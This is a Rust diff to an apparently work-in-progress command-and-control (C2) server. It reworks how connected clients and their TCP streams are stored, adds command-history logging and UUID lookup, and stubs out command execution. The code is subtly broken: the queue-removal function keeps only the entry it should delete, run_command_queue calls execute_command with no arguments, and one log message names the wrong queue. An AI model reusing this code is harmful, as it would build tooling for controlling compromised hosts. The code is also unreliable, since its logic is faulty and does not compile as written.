@@ -15,19 +15,19 @@ use crate::log::*;
 
 #[derive(Debug)]
 pub struct C2 {
-    pub clients: Arc<RwLock<Vec<Client>>>,
+    pub clients: Arc<RwLock<HashMap<Client, TcpStream>>>,
     pub max_clients: usize,
-    command_queue: RwLock<Vec<CommandEntry>>,
-    command_history: RwLock<Vec<CommandEntry>>,
+    command_queue: Arc<RwLock<Vec<CommandEntry>>>,
+    command_history: Arc<RwLock<Vec<CommandEntry>>>,
 }
 
 impl C2 {
     pub fn new() -> Self {
         C2 {
-            clients: Arc::new(RwLock::new(Vec::new())),
+            clients: Arc::new(RwLock::new(HashMap::new())),
             max_clients: 100, // Default max clients
-            command_queue: RwLock::new(Vec::new()),
-            command_history: RwLock::new(Vec::new()),
+            command_queue: Arc::new(RwLock::new(Vec::new())),
+            command_history: Arc::new(RwLock::new(Vec::new())),
         }
     }
 
@@ -53,7 +53,8 @@ impl C2 {
                         ),
                     ));
                     self.save_client(
-                        Client::new(socket, "hostname".to_owned(), client_address.to_string()),
+                        Client::new("hostname".to_owned(), client_address.to_string()),
+                        socket,
                         logstorage,
                     )
                     .await;
@@ -68,11 +69,16 @@ impl C2 {
         }
     }
 
-    async fn save_client(&mut self, client: Client, logstorage: &mut LogStorage) {
+    async fn save_client(
+        &mut self,
+        client: Client,
+        stream: TcpStream,
+        logstorage: &mut LogStorage,
+    ) {
         let mut clients = self.clients.write().await;
 
         if clients.len() + 1 < self.max_clients {
-            clients.push(client);
+            clients.insert(client, stream);
             logstorage.add_log(C2Log::new(
                 LogLevel::Info,
                 format!("Saved Client to Storage!"),
@@ -98,21 +104,52 @@ impl C2 {
         ));
     }
 
-    async fn get_hostname_from_uuid(&self, uuid: Uuid) -> Option<String> {
+    pub async fn add_command_to_history(
+        &mut self,
+        command_entry: CommandEntry,
+        logstorage: &mut LogStorage,
+    ) {
+        self.command_history.write().await.push(command_entry);
+        logstorage.add_log(C2Log::new(
+            LogLevel::Info,
+            format!("Added command to command queue!"),
+        ));
+    }
+
+    async fn get_client_from_uuid(&self, uuid: Uuid) -> Option<Client> {
         self.clients
             .read()
             .await
-            .iter()
-            .find(|client| client.hostname == uuid.to_string())
-            .map(|client| client.hostname.clone())
+            .keys()
+            .find(|client| client.id == uuid)
+            .map(|client| client.clone())
     }
 
     async fn get_command_queue(&self) -> Vec<CommandEntry> {
-        let commands = self.command_queue.write().await.to_vec();
-        todo!()
+        self.command_queue.read().await.to_vec()
     }
 
-    fn remove_command_from_queue(&self, command_entry: CommandEntry) {}
+    async fn remove_command_from_queue(&self, id: Uuid) {
+        self.command_queue
+            .write()
+            .await
+            .retain(|client| client.id == id);
+    }
 
-    pub fn iter_queue(&mut self) {}
+    async fn execute_command(
+        command: CommandEntry,
+        hosts: Vec<Client>,
+    ) -> Result<(), std::io::Error> {
+        Ok(())
+    }
+
+    async fn run_command_queue(
+        &mut self,
+        logstorage: &mut LogStorage,
+    ) -> Result<(), std::io::Error> {
+        if let Some(command) = self.command_queue.read().await.first() {
+            Self::execute_command()
+        }
+        Ok(())
+    }
 }
